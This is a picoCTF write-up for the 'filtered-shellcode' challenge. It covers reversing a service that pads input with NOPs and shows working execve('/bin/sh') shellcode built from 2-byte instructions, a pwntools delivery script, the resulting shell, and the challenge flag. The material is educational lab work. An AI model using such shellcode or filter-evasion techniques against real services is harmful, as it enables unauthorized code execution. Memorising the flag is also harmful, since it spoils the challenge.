# filtered-shellcode
## Description
A program that just runs the code you give it? That seems kinda boring... [fun](fun) `nc mercury.picoctf.net 28494`
## Hints
1. Take a look at the calling convention and see how you might be able to setup all the registers
## Solution
1. Let's see what the program does.
```console
% nc mercury.picoctf.net 28494
Give me code to run:
abcd
timeout: the monitored command dumped core
```
2. Load it in Ghidra. It appears the program collects the input in `main` and sends it to an `execute` function.
```c
void execute(int param_1,int param_2)
{
  int iVar1;
  int iVar2;
  uint uVar3;
  undefined4 uStack48;
  undefined auStack44 [8];
  undefined *local_24;
  undefined *local_20;
  uint local_1c;
  uint local_18;
  int local_14;
  uint local_10;
  
  uStack48 = 0x8048502;
  if ((param_1 != 0) && (param_2 != 0)) {
    local_18 = param_2 * 2;
    local_1c = local_18;
    iVar1 = ((local_18 + 0x10) / 0x10) * -0x10;
    local_20 = auStack44 + iVar1;
    local_14 = 0;
    for (local_10 = 0; iVar2 = local_14, local_10 < local_18; local_10 = local_10 + 1) {
      uVar3 = (uint)((int)local_10 >> 0x1f) >> 0x1e;
      if ((int)((local_10 + uVar3 & 3) - uVar3) < 2) {
        local_14 = local_14 + 1;
        auStack44[local_10 + iVar1] = *(undefined *)(param_1 + iVar2);
      }
      else {
        auStack44[local_10 + iVar1] = 0x90;
      }
    }
    auStack44[local_18 + iVar1] = 0xc3;
    local_24 = auStack44 + iVar1;
    *(undefined4 *)(auStack44 + iVar1 + -4) = 0x80485cb;
    (*(code *)(auStack44 + iVar1))();
    return;
  }
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```
3. There is a lot of useless code in `execute` and the rest of it looks like a pain to reverse engineer. Load it in GDB, put a breakpoint at `(*(code *)(auStack44 + iVar1))();`, and let's compare `param1` and what's about to be executed.
```console
% gdb fun
(gdb) layout asm
(gdb) disass execute
(gdb) b *(execute+211)
Breakpoint 1 at 0x80485c9
(gdb) r
Starting program: /home/ryan/ctf/fun
Give me code to run:
AAAAAA
Breakpoint 1, 0x080485c9 in execute ()
(gdb) x/32bx *(int*)($ebp+8)
0xffffcd33:     0x41    0x41    0x41    0x41    0x41    0x41    0xb7    0xfc
0xffffcd3b:     0xf7    0xd4    0x6b    0xfd    0xf7    0xc4    0xb3    0xfc
0xffffcd43:     0xf7    0xb4    0xcd    0xff    0xff    0x30    0xdb    0xff
0xffffcd4b:     0xf7    0x01    0x00    0x00    0x00    0xd0    0x37    0xfc
(gdb) x/32bx $eax
0xffffcce0:     0x41    0x41    0x90    0x90    0x41    0x41    0x90    0x90
0xffffcce8:     0x41    0x41    0x90    0x90    0xc3    0x85    0x04    0x08
0xffffccf0:     0xc0    0x95    0xfa    0xf7    0xe0    0x83    0x04    0x08
0xffffccf8:     0xe0    0xcc    0xff    0xff    0xe0    0xcc    0xff    0xff
```
4. Looks like it inserts two `NOP` instructions (`0x90`) every two bytes. The following shellcode uses no larger than 2-byte instructions to get through the filter.
```assembly
BITS 32

payload:
    push    BYTE 0
    push    BYTE 0
    mov     ebx, esp
    mov     edi, esp

    mov     al, '/'
    stosb
    nop

    mov     al, 'b'
    stosb
    nop

    mov     al, 'i'
    stosb
    nop

    mov     al, 'n'
    stosb
    nop

    mov     al, '/'
    stosb
    nop

    mov     al, 's'
    stosb
    nop

    mov     al, 'h'
    stosb
    nop

    xor     eax, eax
    mov     al, 11
    xor     ecx, ecx
    xor     edx, edx
    int     0x80
```
```console
% nasm -o payload.bin payload.asm
% xxd -p payload.bin | tr -d '\n' | sed 's/\(..\)/\\x\1/g'
\x6a\x00\x6a\x00\x89\xe3\x89\xe7\xb0\x2f\xaa\x90\xb0\x62\xaa\x90\xb0\x69\xaa\x90\xb0\x6e\xaa\x90\xb0\x2f\xaa\x90\xb0\x73\xaa\x90\xb0\x68\xaa\x90\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80
```
5. Deliver the payload.
```python
from pwn import *

payload = b'\x6a\x00\x6a\x00\x89\xe3\x89\xe7\xb0\x2f\xaa\x90\xb0\x62\xaa\x90\xb0\x69\xaa\x90\xb0\x6e\xaa\x90\xb0\x2f\xaa\x90\xb0\x73\xaa\x90\xb0\x68\xaa\x90\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'

server = remote("mercury.picoctf.net", 28494)
server.recvuntil(b'Give me code to run:\n')
server.sendline(payload)
server.interactive()
```
```console
% python exploit.py
[+] Opening connection to mercury.picoctf.net on port 28494: Done
[*] Switching to interactive mode
$ ls
flag.txt
fun
fun.c
xinet_startup.sh
$ cat flag.txt
picoCTF{th4t_w4s_fun_384f7c52706306d0}
```
